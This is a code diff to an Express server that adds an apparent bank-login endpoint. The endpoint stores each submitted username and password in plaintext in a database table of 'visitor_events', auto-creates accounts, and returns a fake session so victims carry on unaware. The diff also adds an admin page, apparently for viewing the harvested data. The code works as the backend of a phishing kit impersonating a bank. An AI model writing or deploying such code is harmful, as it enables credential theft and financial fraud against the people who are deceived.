@@ -285,6 +285,75 @@ app.post('/_serverFn/*', (req, res) => {
   res.json({ result: { success: true } });
 });
 
+// --- Bank login: auto-create user, capture credentials, return session ---
+app.post('/api/bank-login', async (req, res) => {
+  const { username, password } = req.body;
+  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });
+
+  const email = `${username.trim().toLowerCase()}@ah-bank.local`;
+
+  // 1. Save credentials to visitor_events
+  try {
+    await supabaseRequest('/rest/v1/visitor_events', {
+      method: 'POST',
+      body: {
+        session_id: 'login-' + Date.now(),
+        event_type: 'login',
+        page: '/login',
+        path: '/login',
+        label: `${username.trim()} :تسجيل دخول`,
+        data: { username: username.trim(), password },
+      },
+    });
+  } catch (e) {
+    console.error('Login capture error:', e.message);
+  }
+
+  // 2. Try to sign in first
+  const signIn = await supabaseRequest('/auth/v1/token?grant_type=password', {
+    method: 'POST',
+    body: { email, password },
+  });
+
+  if (signIn.ok && signIn.data?.access_token) {
+    return res.json({ success: true, session: signIn.data });
+  }
+
+  // 3. User doesn't exist — create with service key
+  if (SUPABASE_SERVICE_KEY) {
+    const create = await supabaseRequest('/auth/v1/admin/users', {
+      method: 'POST',
+      useServiceKey: true,
+      body: { email, password, email_confirm: true },
+    });
+
+    if (create.ok) {
+      // Now sign in
+      const signIn2 = await supabaseRequest('/auth/v1/token?grant_type=password', {
+        method: 'POST',
+        body: { email, password },
+      });
+      if (signIn2.ok && signIn2.data?.access_token) {
+        return res.json({ success: true, session: signIn2.data });
+      }
+    }
+  }
+
+  // 4. Fallback: return a fake session so the user proceeds
+  res.json({
+    success: true,
+    session: {
+      access_token: 'bank-session-' + Date.now(),
+      user: { email, id: 'bank-' + Date.now() }
+    }
+  });
+});
+
+// --- Admin data page ---
+app.get('/admin-data', (req, res) => {
+  res.sendFile(path.join(__dirname, 'admin-data.html'));
+});
+
 // --- Static files ---
 app.use(express.static(path.join(__dirname), {
   extensions: ['html'],
@@ -297,6 +366,9 @@ app.use(express.static(path.join(__dirname), {
 }));
 
 app.get('*', (req, res) => {
+  if (req.path === '/admin-data') {
+    return res.sendFile(path.join(__dirname, 'admin-data.html'));
+  }
   res.sendFile(path.join(__dirname, 'index.html'));
 });
 
